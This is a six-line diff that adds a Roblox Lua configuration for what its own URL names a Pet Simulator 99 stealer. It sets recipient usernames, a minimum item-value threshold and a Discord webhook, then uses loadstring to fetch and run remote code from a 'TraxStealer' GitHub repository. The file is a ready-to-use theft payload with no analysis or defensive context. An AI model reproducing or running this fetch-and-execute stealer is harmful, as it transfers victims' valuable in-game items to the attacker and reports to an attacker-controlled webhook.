@@ -1,0 +1,6 @@
+Username = "Antecazure"
+Username2 = "Antecazure"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1341077046180450345/ppWnKBayDakhxRwmodW-yT6FsuZRQk8V9gON4Ut-CPCMw6Oe3CkDkxCYXJ0glxo985-M"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
